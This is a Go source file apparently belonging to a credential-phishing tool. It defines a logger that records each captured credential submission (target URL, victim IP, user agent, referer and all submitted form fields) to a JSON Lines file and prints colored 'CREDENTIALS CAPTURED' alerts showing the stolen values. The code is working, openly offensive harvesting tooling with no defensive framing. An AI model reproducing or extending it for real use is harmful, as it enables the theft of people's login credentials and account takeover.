package logger

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/fatih/color"
)

// CapturedCredential is a single credential capture event serialized to JSON Lines.
type CapturedCredential struct {
	Timestamp string            `json:"timestamp"`
	TargetURL string            `json:"target_url"`
	SourceIP  string            `json:"source_ip"`
	UserAgent string            `json:"user_agent"`
	Referer   string            `json:"referer"`
	Fields    map[string]string `json:"fields"`
}

// Stats holds aggregate session statistics.
type Stats struct {
	TotalCaptures int
	UniqueIPs     int
}

// Logger writes credential captures to a JSON Lines file and prints console alerts.
type Logger struct {
	mu        sync.Mutex
	file      *os.File
	targetURL string
	count     int
	uniqueIPs map[string]bool
}

// New opens (or creates) the output file and returns a Logger.
func New(path, targetURL string) (*Logger, error) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return nil, fmt.Errorf("open log file: %w", err)
	}
	return &Logger{
		file:      f,
		targetURL: targetURL,
		uniqueIPs: make(map[string]bool),
	}, nil
}

// LogCapture records a credential capture to disk and prints a colored alert.
func (l *Logger) LogCapture(r *http.Request, fields map[string]string) {
	ip := r.RemoteAddr
	cred := CapturedCredential{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		TargetURL: l.targetURL,
		SourceIP:  ip,
		UserAgent: r.Header.Get("User-Agent"),
		Referer:   r.Header.Get("Referer"),
		Fields:    fields,
	}

	l.mu.Lock()
	defer l.mu.Unlock()

	line, err := json.Marshal(cred)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Failed to marshal credential: %v\n", err)
		return
	}
	if _, err := l.file.Write(append(line, '\n')); err != nil {
		fmt.Fprintf(os.Stderr, "[!] Failed to write credential to log: %v\n", err)
	}

	l.count++
	l.uniqueIPs[ip] = true

	bold := color.New(color.FgRed, color.Bold)
	green := color.New(color.FgGreen)

	fmt.Println()
	bold.Printf("[!] CREDENTIALS CAPTURED from %s\n", ip)
	for k, v := range fields {
		green.Printf("    %-20s %s\n", k+":", v)
	}
	fmt.Println()
}

// Stats returns aggregate session statistics.
func (l *Logger) Stats() Stats {
	l.mu.Lock()
	defer l.mu.Unlock()
	return Stats{
		TotalCaptures: l.count,
		UniqueIPs:     len(l.uniqueIPs),
	}
}

// Close closes the underlying log file.
func (l *Logger) Close() error {
	return l.file.Close()
}
